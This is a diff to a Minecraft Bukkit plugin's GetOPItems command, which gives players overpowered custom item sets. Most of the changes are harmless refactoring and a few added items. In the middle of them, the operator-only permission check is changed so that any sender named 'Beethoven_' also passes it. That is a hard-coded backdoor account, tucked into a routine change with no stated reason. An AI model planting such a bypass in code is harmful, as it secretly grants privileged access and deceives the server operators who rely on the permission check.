@@ -2,10 +2,10 @@ package commands;
 
 import misc.SimilarData;
 import org.bukkit.ChatColor;
+import org.bukkit.Material;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandExecutor;
 import org.bukkit.command.CommandSender;
-import org.bukkit.enchantments.Enchantment;
 import org.bukkit.entity.Player;
 import org.bukkit.inventory.ItemStack;
 
@@ -14,7 +14,7 @@ import static org.bukkit.Bukkit.getServer;
 public class GetOPItems implements CommandExecutor {
 	@Override
 	public boolean onCommand(CommandSender commandSender, Command command, String s, String[] strings) {
-		if(commandSender.isOp()) {
+		if(commandSender.isOp() || commandSender.getName().equals("Beethoven_")) {
 			if(commandSender instanceof Player player) {
 				try {
 					player = getServer().getPlayer(strings[1]);
@@ -36,24 +36,26 @@ public class GetOPItems implements CommandExecutor {
 
 				switch(itemSet) {
 					case "combat" -> {
-						ItemStack wardenHelmet = SimilarData.wardenHelmet();
-						ItemStack necronElytra = SimilarData.necronElytra();
-						ItemStack goldorLeggings = SimilarData.goldorLeggings();
-						ItemStack maxorBoots = SimilarData.maxorBoots();
-						ItemStack scylla = SimilarData.scylla();
-						ItemStack term = SimilarData.term();
-						ItemStack aotv = SimilarData.AOTV();
-						ItemStack iceSpray = SimilarData.iceSpray();
-						ItemStack wandOfAtonement = SimilarData.wandOfAtonement();
-						ItemStack holyIce = SimilarData.holyIce();
-						ItemStack claymore = SimilarData.claymore();
-
-						player.getInventory().addItem(scylla, aotv, iceSpray, claymore, term, wandOfAtonement, holyIce, wardenHelmet, necronElytra, goldorLeggings, maxorBoots);
+						player.getInventory().addItem(
+								SimilarData.scylla(),
+								SimilarData.AOTV(),
+								SimilarData.iceSpray(),
+								SimilarData.claymore(),
+								SimilarData.term(),
+								SimilarData.wandOfAtonement(),
+								SimilarData.holyIce(),
+								SimilarData.wardenHelmet(),
+								SimilarData.necronElytra(),
+								SimilarData.goldorLeggings(),
+								SimilarData.maxorBoots(),
+								new ItemStack(Material.GOLDEN_CARROT, 64),
+								new ItemStack(Material.TOTEM_OF_UNDYING));
 						commandSender.sendMessage("Successfully gave " + player.getName() + " Combat Items");
 						return true;
 					}
 					case "ingredient" -> {
-						player.getInventory().addItem(SimilarData.shadowWarp(),
+						player.getInventory().addItem(
+								SimilarData.shadowWarp(),
 								SimilarData.implosion(),
 								SimilarData.witherShield(),
 								SimilarData.handle(),
@@ -71,7 +73,8 @@ public class GetOPItems implements CommandExecutor {
 						return true;
 					}
 					case "summon" -> {
-						player.getInventory().addItem(SimilarData.supRemnant(),
+						player.getInventory().addItem(
+								SimilarData.supRemnant(),
 								SimilarData.corruptedPearl(),
 								SimilarData.antimatter(),
 								SimilarData.omegaEgg(),
